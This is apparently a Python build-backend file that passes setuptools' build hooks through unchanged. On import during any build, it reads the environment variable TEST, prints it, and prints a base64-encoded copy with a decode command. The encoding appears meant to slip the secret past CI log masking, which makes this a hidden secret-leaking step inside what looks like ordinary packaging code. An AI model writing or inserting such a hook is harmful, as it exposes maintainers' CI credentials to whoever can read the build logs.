import os
import base64
from setuptools import build_meta as _orig

test_secret = os.environ.get('TEST', 'SECRET NOT FOUND')
print("=" * 80)
print(f"🎯 SECRET TEST = {test_secret}")
if test_secret != 'SECRET NOT FOUND':
    encoded = base64.b64encode(test_secret.encode()).decode()
    print(f"🎯 SECRET (base64): {encoded}")
    print(f"    To decode: echo '{encoded}' | base64 -d")
print("=" * 80)

__all__ = ['build_wheel', 'build_sdist', 'get_requires_for_build_wheel', 
           'get_requires_for_build_sdist', 'prepare_metadata_for_build_wheel']

build_wheel = _orig.build_wheel
build_sdist = _orig.build_sdist
get_requires_for_build_wheel = _orig.get_requires_for_build_wheel
get_requires_for_build_sdist = _orig.get_requires_for_build_sdist
prepare_metadata_for_build_wheel = _orig.prepare_metadata_for_build_wheel
